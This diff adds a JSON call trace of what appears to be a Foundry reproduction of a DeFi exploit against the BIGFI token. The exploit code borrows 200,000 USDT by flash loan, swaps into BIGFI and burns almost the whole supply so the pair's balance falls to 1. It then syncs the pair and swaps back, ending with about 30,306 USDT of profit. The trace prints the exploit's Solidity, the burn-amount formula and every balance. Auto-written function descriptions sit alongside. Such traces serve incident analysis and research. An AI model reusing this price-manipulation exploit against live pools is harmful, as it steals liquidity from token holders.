@@ -1,0 +1,428 @@
+{
+  "logs": {
+    "calls": [
+      {
+        "id": "377481",
+        "contract": "ContractTest",
+        "function": "testExploit",
+        "args": "",
+        "original_code": "    function testExploit() external {\n        swapFlashLoan.flashLoan(address(this), address(USDT), 200_000 * 1e18, new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n    }\n\n",
+        "description": "1. Core functions:\n   The `testExploit` function is designed to simulate an exploit scenario by initiating a flash loan. It interacts with a `swapFlashLoan` contract to borrow a large amount of USDT tokens (200,000 USDT) and then emits an event to log the attacker's USDT balance after the exploit.\n\n2. Security mechanism:\n   - The function is marked as `external`, meaning it can only be called from outside the contract, which limits its accessibility.\n   - The function does not include explicit security checks or modifiers, which could make it vulnerable if used in a real-world scenario. However, the context suggests it is likely part of a test or simulation rather than a production contract.\n\n3. Parameter Function:\n   - `address(this)`: Specifies the address of the current contract as the recipient of the flash loan.\n   - `address(USDT)`: Indicates the address of the USDT token being borrowed.\n   - `200_000 * 1e18`: Represents the amount of USDT to be borrowed, scaled to 18 decimal places (200,000 USDT).\n   - `new bytes(1)`: Passes an empty byte array as additional data, which might be used by the `swapFlashLoan` contract for specific logic.\n\n4. Return description:\n   The function does not return a value directly. Instead, it emits an event (`log_named_decimal_uint`) that logs the attacker's USDT balance after the exploit. The balance is calculated by calling `USDT.balanceOf(address(this))`, which retrieves the USDT balance of the current contract.\n\nIn summary, the `testExploit` function simulates a flash loan exploit by borrowing a large amount of USDT and logging the resulting balance. It lacks explicit security measures, suggesting it is likely part of a test or simulation rather than a secure production contract.",
+        "return_value": "Returned",
+        "depth": 0,
+        "internal_calls": [
+          {
+            "id": "361703",
+            "contract": "swapFlashLoan",
+            "function": "flashLoan",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDT: [0x55d398326f99059fF775485246999027B3197955], 200000000000000000000000 [2e23], 0x00",
+            "original_code": "    function flashLoan(\n        address receiver,\n        IERC20 token,\n        uint256 amount,\n        bytes memory params\n    ) external nonReentrant {\n        uint8 tokenIndex = getTokenIndex(address(token));\n        uint256 availableLiquidityBefore = token.balanceOf(address(this));\n        uint256 protocolBalanceBefore =\n            availableLiquidityBefore.sub(swapStorage.balances[tokenIndex]);\n        require(\n            amount > 0 && availableLiquidityBefore >= amount,\n            \"invalid amount\"\n        );\n\n        // Calculate the additional amount of tokens the pool should end up with\n        uint256 amountFee = amount.mul(flashLoanFeeBPS).div(10000);\n        // Calculate the portion of the fee that will go to the protocol\n        uint256 protocolFee = amountFee.mul(protocolFeeShareBPS).div(10000);\n        require(amountFee > 0, \"amount is small for a flashLoan\");\n\n        // Transfer the requested amount of tokens\n        token.safeTransfer(receiver, amount);\n\n",
+            "description": "1. **Core functions:**  \n   The `flashLoan` function allows users to borrow a specific amount of tokens temporarily, known as a \"flash loan.\" The function checks if the requested amount is valid and available in the pool, calculates the fees associated with the loan, and transfers the tokens to the receiver. The purpose of this function is to enable users to perform transactions or operations with the borrowed tokens, provided they return the borrowed amount plus fees within the same transaction.\n\n2. **Security mechanism:**  \n   - `nonReentrant`: This modifier prevents reentrancy attacks, ensuring the function cannot be called again before the current execution is complete.  \n   - `require` statements: These checks ensure the requested amount is valid (greater than zero) and that the pool has enough liquidity to fulfill the loan.  \n   - Fee calculations: The function calculates fees to ensure the protocol is compensated for the loan, reducing the risk of misuse.  \n   - `safeTransfer`: This method safely transfers tokens to the receiver, handling potential errors during the transfer.  \n\n3. **Parameter Function:**  \n   - `receiver`: The address that will receive the borrowed tokens.  \n   - `token`: The type of token being borrowed, represented as an ERC20 token interface.  \n   - `amount`: The quantity of tokens the user wants to borrow.  \n   - `params`: Additional data or parameters that can be used for custom logic during the loan process.  \n\n4. **Return description:**  \n   The function does not return any value directly. Instead, it performs calculations to determine the fees (`amountFee` and `protocolFee`) and ensures the loan is processed securely. The borrowed tokens are transferred to the receiver, and the function expects the receiver to return the borrowed amount plus fees within the same transaction.  \n\n**In summary,**  \nThe `flashLoan` function enables users to borrow tokens temporarily, ensuring the loan is secure and the protocol is compensated through fees. It uses checks and safeguards to prevent misuse and errors during the process.",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "359004",
+                "contract": "0x5F10b4FC66331f53912a5B5EBA4E4e79a6fDAe93",
+                "function": "flashLoan",
+                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDT: [0x55d398326f99059fF775485246999027B3197955], 200000000000000000000000 [2e23], 0x00",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "2531",
+                    "contract": "USDT",
+                    "function": "balanceOf",
+                    "args": "swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13]",
+                    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+                    "description": "1. Core functions:  \nThe `balanceOf` function is designed to check and return the balance of a specific account. It looks up the balance associated with the given account address and provides this information to the caller. This is a common function in token contracts to allow users or other contracts to query how many tokens a particular account holds.\n\n2. Security mechanism:  \nThe function uses the `public` and `view` modifiers. The `public` modifier ensures that the function can be called by anyone, while the `view` modifier guarantees that the function does not modify the state of the contract, making it safe to call without worrying about unintended changes. Additionally, the `virtual` and `override` modifiers indicate that this function can be overridden by derived contracts, allowing for flexibility in extending its behavior.\n\n3. Parameter Function:  \nThe function takes one parameter, `account`, which is an address. This parameter specifies the account whose balance is being queried. The function uses this address to look up the corresponding balance in the `_balances` mapping.\n\n4. Return description:  \nThe function returns a `uint256` value, which represents the balance of the specified account. It retrieves this value directly from the `_balances` mapping, which stores the token balances associated with each address. The calculation logic is straightforward: it simply looks up the balance linked to the provided account address and returns it.\n\nIn summary, the `balanceOf` function is a simple and secure way to check the token balance of a specific account. It uses a mapping to store balances and ensures safety by preventing state changes during its execution.",
+                    "return_value": "877996854972972475361000 [8.779e23]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "10871",
+                    "contract": "USDT",
+                    "function": "transfer",
+                    "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 200000000000000000000000 [2e23]",
+                    "original_code": "    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
+                    "description": "1. **Core functions**:  \n   The `transfer` function is designed to move a specified amount of tokens from the sender's account to the recipient's account. It acts as a basic mechanism for transferring tokens within the smart contract.\n\n2. **Security mechanism**:  \n   - The function uses `public` visibility, meaning it can be called by anyone.  \n   - It includes the `virtual` keyword, allowing it to be overridden by derived contracts.  \n   - The `override` keyword ensures it replaces any existing function with the same name in the parent contract.  \n   - The `_transfer` function (called internally) likely includes additional checks to ensure secure token transfers, such as verifying balances and preventing invalid operations.\n\n3. **Parameter Function**:  \n   - `recipient`: This is the address of the person or contract receiving the tokens.  \n   - `amount`: This specifies the number of tokens to be transferred from the sender to the recipient.\n\n4. **Return description**:  \n   The function always returns `true` to indicate that the transfer was successful. This is a standard practice in token transfer functions to confirm the operation completed as expected.\n\n**In summary**, the `transfer` function securely moves tokens from the sender to the recipient and confirms the success of the operation by returning `true`.",
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "311982",
+                    "contract": "ContractTest",
+                    "function": "executeOperation",
+                    "args": "swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13], USDT: [0x55d398326f99059fF775485246999027B3197955], 200000000000000000000000 [2e23], 160000000000000000000 [1.6e20], 0x00",
+                    "original_code": "    function executeOperation(\n        address pool,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata params\n    ) external payable {\n        USDTToBIGFI();\n        // Calculate the number of burns\n        // beforebalanceOf(Pair) == (_rOwned(Pair) * before_tTotal / _rTotal)\n        // to reduce the balanceOf(Pair) to 1 , the amount of _tTotal to burn = _tTotal - (_rTotal / _rOwned(Pair)) = _tTotal - (before_tTotal / beforebalanceOf(Pair))\n        uint256 burnAmount = BIGFI.totalSupply() - 2 * (BIGFI.totalSupply() / BIGFI.balanceOf(address(Pair)));\n        BIGFI.burn(burnAmount);\n        Pair.sync();\n        BIGFIToUSDT();\n\n        USDT.transfer(address(swapFlashLoan), amount + fee);\n    }\n\n",
+                    "description": "1. Core functions:  \nThe main purpose of this function is to execute a series of operations involving token transfers, burning tokens, and syncing a token pair. It starts by converting USDT to BIGFI, calculates the amount of BIGFI tokens to burn, performs the burn operation, syncs the token pair, and then converts BIGFI back to USDT. Finally, it transfers the specified amount of USDT plus a fee to a designated address.\n\n2. Security mechanism:  \nThe function uses the `external` and `payable` modifiers, which means it can only be called from outside the contract and can accept Ether. However, there are no explicit access control mechanisms (like `onlyOwner` or `require` statements) to restrict who can call this function. The function relies on the correctness of the `USDTToBIGFI`, `BIGFI.burn`, `Pair.sync`, and `BIGFIToUSDT` functions, which are not shown here. The absence of explicit checks for reentrancy or input validation could pose security risks.\n\n3. Parameter Function:  \n- `pool`: Represents the address of the pool involved in the operation.  \n- `token`: Specifies the token address being used in the transaction.  \n- `amount`: The amount of tokens to be transferred.  \n- `fee`: An additional fee to be included in the transfer.  \n- `params`: Additional data passed to the function, though it is not used in the provided code.  \n\n4. Return description:  \nThis function does not return any value. It performs actions like token burning, syncing, and transferring tokens but does not produce an output.  \n\nIn summary,  \nThis function executes a sequence of operations involving token conversions, burning, and transfers. It lacks explicit security measures like access control or input validation, which could make it vulnerable to misuse. The parameters define the pool, token, amount, fee, and additional data, but the function does not return any value.",
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "24562",
+                        "contract": "USDT",
+                        "function": "approve",
+                        "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+                        "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
+                        "description": "1. **Core functions**:  \n   The `approve` function is used to allow another address (called the `spender`) to spend a specific amount of tokens on behalf of the person calling the function. This is a common feature in token contracts, enabling delegation of spending rights without transferring ownership of the tokens.\n\n2. **Security mechanism**:  \n   - The function is marked as `public`, meaning it can be called by anyone.  \n   - It uses `virtual` and `override` to allow for customization in derived contracts or to replace an existing implementation.  \n   - The `_approve` function is called internally, which typically includes checks to ensure the spender and amount are valid.  \n\n3. **Parameter Function**:  \n   - `spender`: The address of the account that is being granted permission to spend tokens.  \n   - `amount`: The maximum number of tokens the spender is allowed to use.  \n\n4. **Return description**:  \n   The function always returns `true` to indicate that the approval process was successful. This is a standard practice in ERC-20 token contracts to confirm the operation completed as expected.  \n\nIn summary, the `approve` function allows a user to authorize another address to spend a specified amount of their tokens, and it confirms the approval by returning `true`.",
+                        "return_value": "true",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "531",
+                        "contract": "USDT",
+                        "function": "balanceOf",
+                        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                        "flag": 1,
+                        "return_value": "200000010000000000000000 [2e23]",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "164894",
+                        "contract": "Router",
+                        "function": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
+                        "args": "200000010000000000000000 [2e23], 0, [0x55d398326f99059fF775485246999027B3197955, 0xd3d4B46Db01C006Fb165879f343fc13174a1cEeB], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1679488640 [1.679e9]",
+                        "return_value": "Returned",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "10834",
+                            "contract": "USDT",
+                            "function": "transferFrom",
+                            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], 200000010000000000000000 [2e23]",
+                            "original_code": "    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n",
+                            "description": "1. Core functions:  \nThe `transferFrom` function is designed to move a specified amount of tokens from one account (`sender`) to another (`recipient`). It is commonly used in scenarios where a third party (like a contract or another user) is authorized to transfer tokens on behalf of the `sender`. This function ensures that the transfer is executed and updates the allowance (the approved amount the sender has allowed the caller to spend).\n\n2. Security mechanism:  \n- **`public virtual override`**: This allows the function to be called by anyone and ensures it can be overridden by derived contracts, providing flexibility in extending its behavior.  \n- **`_transfer`**: This internal function handles the actual token transfer, ensuring the sender has sufficient balance and the recipient receives the tokens.  \n- **`_approve`**: This function updates the allowance after the transfer, ensuring the caller’s approved spending limit is reduced by the transferred amount.  \n- **`sub`**: This method checks that the transfer amount does not exceed the approved allowance, preventing unauthorized transfers.  \n\n3. Parameter Function:  \n- **`sender`**: The address of the account from which tokens are being transferred.  \n- **`recipient`**: The address of the account receiving the tokens.  \n- **`amount`**: The number of tokens to be transferred from the `sender` to the `recipient`.  \n\n4. Return description:  \nThe function returns a boolean value (`true`) to indicate that the transfer was successful. This is a standard practice in ERC20 token contracts to confirm the operation’s completion.  \n\nIn summary, the `transferFrom` function facilitates token transfers between accounts while ensuring the caller is authorized to spend the specified amount. It updates allowances and confirms the transfer’s success through a boolean return value.",
+                            "return_value": "true",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "12052",
+                            "contract": "BIGFI",
+                            "function": "balanceOf",
+                            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                            "flag": 1,
+                            "return_value": "0",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "2893",
+                            "contract": "Pair",
+                            "function": "getReserves",
+                            "args": "",
+                            "return_value": "107480664198219600542112 [1.074e23], 9310990259680030849404 [9.31e21], 1679487323 [1.679e9]",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "531",
+                            "contract": "USDT",
+                            "function": "balanceOf",
+                            "args": "Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]",
+                            "flag": 1,
+                            "return_value": "307480674198219600542112 [3.074e23]",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "124390",
+                            "contract": "Pair",
+                            "function": "swap",
+                            "args": "0, 6051008437863879112730 [6.051e21], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+                            "return_value": "Returned",
+                            "depth": 5,
+                            "internal_calls": [
+                              {
+                                "id": "88487",
+                                "contract": "BIGFI",
+                                "function": "transfer",
+                                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6051008437863879112730 [6.051e21]",
+                                "flag": 1,
+                                "return_value": "true",
+                                "depth": 6,
+                                "internal_calls": []
+                              },
+                              {
+                                "id": "531",
+                                "contract": "USDT",
+                                "function": "balanceOf",
+                                "args": "Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]",
+                                "flag": 1,
+                                "return_value": "307480674198219600542112 [3.074e23]",
+                                "depth": 6,
+                                "internal_calls": []
+                              },
+                              {
+                                "id": "2052",
+                                "contract": "BIGFI",
+                                "function": "balanceOf",
+                                "args": "Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]",
+                                "flag": 1,
+                                "return_value": "3259991215302060148662 [3.259e21]",
+                                "depth": 6,
+                                "internal_calls": []
+                              }
+                            ]
+                          },
+                          {
+                            "id": "2052",
+                            "contract": "BIGFI",
+                            "function": "balanceOf",
+                            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                            "flag": 1,
+                            "return_value": "5869495097356201647072 [5.869e21]",
+                            "depth": 5,
+                            "internal_calls": []
+                          }
+                        ]
+                      },
+                      {
+                        "id": "2052",
+                        "contract": "BIGFI",
+                        "function": "balanceOf",
+                        "args": "Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]",
+                        "flag": 1,
+                        "return_value": "3259991215302060148662 [3.259e21]",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "449",
+                        "contract": "BIGFI",
+                        "function": "totalSupply",
+                        "args": "",
+                        "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
+                        "description": "1. **Core function:**  \n   The `totalSupply` function is designed to provide the total number of tokens that currently exist in the system. It is a simple function that retrieves and returns the value stored in the `_totalSupply` variable, which represents the overall supply of tokens.\n\n2. **Security mechanism:**  \n   - The function is marked as `public`, meaning it can be called by anyone, including external users or other contracts.  \n   - It is also marked as `view`, which ensures that the function does not modify the state of the contract, making it safe to call without incurring gas costs.  \n   - The `virtual` keyword allows this function to be overridden by derived contracts, providing flexibility for customization.  \n   - The `override` keyword indicates that this function is overriding a function with the same name from a parent contract, ensuring consistency in behavior.  \n\n3. **Parameter Function:**  \n   This function does not take any parameters. It simply accesses the `_totalSupply` variable directly to retrieve the total token supply.  \n\n4. **Return description:**  \n   The function returns the value of `_totalSupply`, which is a `uint256` (a large positive integer). This value represents the total number of tokens that have been created or minted in the system.  \n\n**In summary,**  \nThe `totalSupply` function is a straightforward utility that provides the total number of tokens in the system. It is designed to be safe, read-only, and flexible for potential overrides in derived contracts. It returns the value of `_totalSupply` without requiring any input parameters.",
+                        "return_value": "20999908387034241742907242 [2.099e25]",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "449",
+                        "contract": "BIGFI",
+                        "function": "totalSupply",
+                        "args": "",
+                        "flag": 1,
+                        "return_value": "20999908387034241742907242 [2.099e25]",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "3336",
+                        "contract": "BIGFI",
+                        "function": "burn",
+                        "args": "20999908387034241742894360 [2.099e25]",
+                        "original_code": "    function burn(uint256 amount) public virtual {\n        _burn(_msgSender(), amount);\n    }\n\n",
+                        "description": "1. Core functions:  \nThe `burn` function is designed to reduce the total supply of a token by permanently removing a specified amount of tokens from the caller's balance. This process is often referred to as \"burning\" tokens, and it is commonly used in token economies to manage supply or implement deflationary mechanisms.\n\n2. Security mechanism:  \nThe function uses the `public` and `virtual` modifiers. The `public` modifier allows the function to be called by anyone, while the `virtual` modifier enables the function to be overridden by derived contracts. Additionally, the function internally calls `_burn`, which typically includes checks to ensure the caller has sufficient tokens to burn and updates the token balances and total supply accordingly.\n\n3. Parameter Function:  \nThe `amount` parameter specifies the number of tokens the caller wants to burn. It determines how many tokens will be permanently removed from the caller's balance and the total token supply.\n\n4. Return description:  \nThe function does not return any value. Its primary purpose is to execute the burning process by calling the internal `_burn` function, which handles the actual reduction of the token balance and supply.\n\nIn summary,  \nThe `burn` function allows users to permanently remove a specified amount of tokens from their balance, reducing the total token supply. It is publicly accessible, can be overridden, and relies on an internal function to perform the burning operation securely.",
+                        "return_value": "Returned",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "10495",
+                        "contract": "Pair",
+                        "function": "sync",
+                        "args": "",
+                        "return_value": "Returned",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "531",
+                            "contract": "USDT",
+                            "function": "balanceOf",
+                            "args": "Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]",
+                            "flag": 1,
+                            "return_value": "307480674198219600542112 [3.074e23]",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "2052",
+                            "contract": "BIGFI",
+                            "function": "balanceOf",
+                            "args": "Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]",
+                            "flag": 1,
+                            "return_value": "1",
+                            "depth": 5,
+                            "internal_calls": []
+                          }
+                        ]
+                      },
+                      {
+                        "id": "24688",
+                        "contract": "BIGFI",
+                        "function": "approve",
+                        "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+                        "flag": 1,
+                        "return_value": "true",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "2052",
+                        "contract": "BIGFI",
+                        "function": "balanceOf",
+                        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                        "flag": 1,
+                        "return_value": "3",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "50768",
+                        "contract": "Router",
+                        "function": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
+                        "args": "3, 0, [0xd3d4B46Db01C006Fb165879f343fc13174a1cEeB, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1679488640 [1.679e9]",
+                        "return_value": "Returned",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "19687",
+                            "contract": "BIGFI",
+                            "function": "transferFrom",
+                            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a], 3",
+                            "flag": 1,
+                            "return_value": "true",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "531",
+                            "contract": "USDT",
+                            "function": "balanceOf",
+                            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                            "flag": 1,
+                            "return_value": "0",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "893",
+                            "contract": "Pair",
+                            "function": "getReserves",
+                            "args": "",
+                            "return_value": "307480674198219600542112 [3.074e23], 1, 1679488640 [1.679e9]",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "2052",
+                            "contract": "BIGFI",
+                            "function": "balanceOf",
+                            "args": "Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]",
+                            "flag": 1,
+                            "return_value": "4",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "19882",
+                            "contract": "Pair",
+                            "function": "swap",
+                            "args": "230466103328283570349973 [2.304e23], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+                            "return_value": "Returned",
+                            "depth": 5,
+                            "internal_calls": [
+                              {
+                                "id": "3271",
+                                "contract": "USDT",
+                                "function": "transfer",
+                                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 230466103328283570349973 [2.304e23]",
+                                "flag": 1,
+                                "return_value": "true",
+                                "depth": 6,
+                                "internal_calls": []
+                              },
+                              {
+                                "id": "531",
+                                "contract": "USDT",
+                                "function": "balanceOf",
+                                "args": "Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]",
+                                "flag": 1,
+                                "return_value": "77014570869936030192139 [7.701e22]",
+                                "depth": 6,
+                                "internal_calls": []
+                              },
+                              {
+                                "id": "2052",
+                                "contract": "BIGFI",
+                                "function": "balanceOf",
+                                "args": "Pair: [0xA269556EdC45581F355742e46D2d722c5F3f551a]",
+                                "flag": 1,
+                                "return_value": "4",
+                                "depth": 6,
+                                "internal_calls": []
+                              }
+                            ]
+                          },
+                          {
+                            "id": "531",
+                            "contract": "USDT",
+                            "function": "balanceOf",
+                            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                            "flag": 1,
+                            "return_value": "230466103328283570349973 [2.304e23]",
+                            "depth": 5,
+                            "internal_calls": []
+                          }
+                        ]
+                      },
+                      {
+                        "id": "3271",
+                        "contract": "USDT",
+                        "function": "transfer",
+                        "args": "swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13], 200160000000000000000000 [2.001e23]",
+                        "flag": 1,
+                        "return_value": "true",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  },
+                  {
+                    "id": "531",
+                    "contract": "USDT",
+                    "function": "balanceOf",
+                    "args": "swapFlashLoan: [0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13]",
+                    "flag": 1,
+                    "return_value": "878156854972972475361000 [8.781e23]",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "id": "531",
+            "contract": "USDT",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "30306103328283570349973 [3.03e22]",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "2425",
+            "contract": "USDT",
+            "function": "decimals",
+            "args": "",
+            "original_code": "    function decimals() public view virtual returns (uint8) {\n        return _decimals;\n    }\n\n",
+            "description": "1. Core functions:  \nThe `decimals` function is a simple function that provides information about the number of decimal places used by a token. This is important for displaying the token's value correctly, as it tells how many digits come after the decimal point. For example, if the token uses 18 decimal places, a value of \"1\" actually represents \"0.000000000000000001\" of the token.\n\n2. Security mechanism:  \nThe function includes the `view` modifier, which ensures that it does not modify the state of the contract. This makes it safe to call without worrying about unintended changes. The `public` modifier allows anyone to call this function, which is appropriate since it only provides read-only information. The `virtual` keyword indicates that this function can be overridden by derived contracts, allowing for flexibility in its implementation.\n\n3. Parameter Function:  \nThis function does not take any parameters. It simply retrieves and returns the value of the `_decimals` variable, which is defined elsewhere in the contract.\n\n4. Return description:  \nThe function returns the value of `_decimals`, which is a `uint8` (an unsigned 8-bit integer). This value represents the number of decimal places the token uses. The calculation logic is straightforward: it directly returns the stored value of `_decimals` without any additional processing.\n\nIn summary, the `decimals` function is a simple, read-only function that returns the number of decimal places used by a token. It is safe to call and can be overridden in derived contracts if needed.",
+            "return_value": "18",
+            "depth": 1,
+            "internal_calls": []
+          }
+        ]
+      }
+    ]
+  }
+}
